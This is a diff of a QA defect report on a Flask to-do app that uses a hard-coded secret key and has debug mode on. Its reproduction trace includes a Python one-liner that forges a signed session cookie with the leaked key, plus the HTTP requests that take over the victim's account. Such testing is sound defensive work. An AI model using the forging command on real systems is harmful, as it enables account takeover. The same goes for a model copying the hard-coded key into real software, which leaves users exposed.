@@ -5,7 +5,7 @@
 | Severity | Major |
 | Found by | Alia (TC-SEC-013) |
 | Related test cases | TC-SEC-013 |
-| Status | Open - **REPRODUCED** on 2026-11-25 13:09:04 |
+| Status | Open - **REPRODUCED** on 2026-11-25 13:40:18 |
 | Environment | Python 3.14.7, Flask 3.0.3, SQLite (fresh temp DB), Windows 11 |
 | Reproduced by | `07_Test_Management/Defect_Evidence/reproduce_defects.py` (def007) |
 
@@ -13,17 +13,33 @@
 Secret read from environment; debug off by default.
 
 ## Actual (observed in this run)
-A cookie forged with the key from the source code is accepted (HTTP 200) - full impersonation of user id 1. Debug server enabled.
+A cookie forged with the key from the source code is accepted (HTTP 200) and returns Alice's private task - full account takeover without a password. Debug server also enabled.
 
-## Captured request / response trace
+## Terminal evidence (PNG)
+Requests replayed as the equivalent `curl` commands; every status code and body shown is the real response from this run.
+
+![Terminal evidence](terminal_evidence.png)
+
+## Root cause in source (PNG)
+
+![Faulty source lines](source_root_cause.png)
+
+## Captured request / response trace (text)
 ```text
-# setup: registered 'alice_d7' -> HTTP 201
-# Session cookie issued by the app: eyJ1c2VyX2lkIjoxMCwidXNlcm5hbWUiOiJhbGljZV9kNyJ9.awZtdg.MJqQ...
-# Attacker signs their own cookie with the hard-coded key: {'user_id': 1}
-[1] >>> GET /api/tasks
+$ grep -n -E "SECRET_KEY|app.run" app/app.py
+    28:app.config["SECRET_KEY"] = "pytodo-pro-dev-secret"
+    482:    app.run(debug=True)
+[1] >>> POST /api/register   json={'username': 'alice_d7', 'password': 'password123'}
+    <<< HTTP 201
+        {"id":10,"username":"alice_d7"}
+[2] >>> POST /api/tasks   json={'title': 'Alice bank PIN reminder'}
+    <<< HTTP 201
+# Attacker never logs in. Using only the key printed above, they sign their own session cookie:
+$ python -c "from flask import Flask; from flask.sessions import SecureCookieSessionInterface as S; a=Flask('x'); a.secret_key='pytodo-pro-dev-secret'; print(S().get_signing_serializer(a).dumps({'user_id': 10, 'username': 'alice_d7'}))"
+    eyJ1c2VyX2lkIjoxMCwidXNlcm5hbWUiOiJhbGljZV9kNyJ9.awZ00Q.6riGgkHboLIRk2SpTtxsBRRf2e0
+[3] >>> GET /api/tasks
     <<< HTTP 200
-        []
-# app.run(debug=True) present in source: True
+        [{"category":null,"category_id":null,"completed_at":null,"created_at":"2026-11-25T13:40:33.247744","description":"","done":false,"due_date":null,"id":8,"title":"Alice bank PIN reminder","urgency":"No due date"}]
 ```
 
 ## Root cause - faulty source lines (`>>` marks the defect)
